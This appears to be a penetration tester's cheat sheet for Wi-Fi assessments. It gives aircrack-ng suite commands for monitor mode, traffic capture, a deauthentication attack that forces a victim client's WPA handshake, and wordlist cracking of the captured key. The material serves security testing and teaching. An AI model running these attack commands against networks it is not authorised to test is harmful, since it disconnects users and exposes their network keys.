# Wi-Fi Assessment Techniques

These are techniques that I have found to work during Wi-Fi assessments (discovery, collection, attack, and crack). This isn't an "end all, be all" list.</br>

# Hardware:
* Need Atheros chipset in the wireless adapter
	* [Check wireless card](https://www.aircrack-ng.org/doku.php?id=compatible_cards)
* TP-Link TL-WN722N
	* has to be earlier than version 2 due to TP-Link updating the chips on the adapters.
* Alfa AWUS051NH

# Configuration: System Setup with Hardware
* Might need to kill Network Manager
```
/etc/init.d/network-manager status
```
```
/etc/init.d/network-manager stop
```
* Ensure hardware is connected
```
lsusb
```
* Check wireless status of network adapter
```
iwconfig
```
* If need to bring up the interface
```
ifconfig wlan0 up
```
* This is an optional step: can stay in Managed mode and scan to do light discovery
```
iwlist wlan0 scanning
```

# Monitor Mode
* This sets wlan0 into Monitor mode. This sets a new interface, typically, mon0 or a variation of ie. wlanmon0
```
airmon-ng start wlan0
```
* Watch aircrack-ng's output of errors. Might need to run the following to kill specific process that hinder aircrack-ng.
```
airmon-ng check kill
```
* Monitor for traffic on Monitor interface (i.e. mon0)
```
airodump-ng mon0 
```
* Stopping Monitor Mode when needed
```
airmon-ng stop wlan0mon
```

# Capture traffic
* Interface will your monitor interface that was set above i.e. mon0
```
airodump-ng -c <Channel> --bssid <AP_MAC> -w <File_Prefix> <interface>
```

# WPA-PSK Attack
* Attacking WPA-PSK - Goal: acquire PSK (pre-shared key)
- Need to identify:
	* Name of the wireless network (ESSID)
	* MAC address of the AP (BSSID)
	* Channel that the AP
	* Victim MAC
	* need to capture 4 way handshake
	* Then crack - see below

# Deauth Attack
* In one terminal collect
``` 
airodump-ng -c <CHANNEL> --bssid  <AP_MAC> -w <FILE_PREFIX> <INTERFACE>
```
* In another termainl deauth
```
aireplay-ng --deauth 25 -a <AP_MAC> -c <VICTIM_MAC> <INTERFACE>
```

# Cracking
* Crack with John the Ripper
```
/usr/sbin/john --rules -w=/usr/share/wordlists/rockyou.txt --stdout | aircrack-ng -w - -e <essid> capture.cap
```
* Brute-Force to get the WPA Key (assumption is the packet capture contains the 4 way handshake)
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa_capture.pcap
```
* I've heard hashcat is more effective but I've have not tried this method.

# Wireshark Tips
* Don't forget to add encryption key information to Wireshark
	* From Menu options: Edit->Preferences->IEEE 802.11
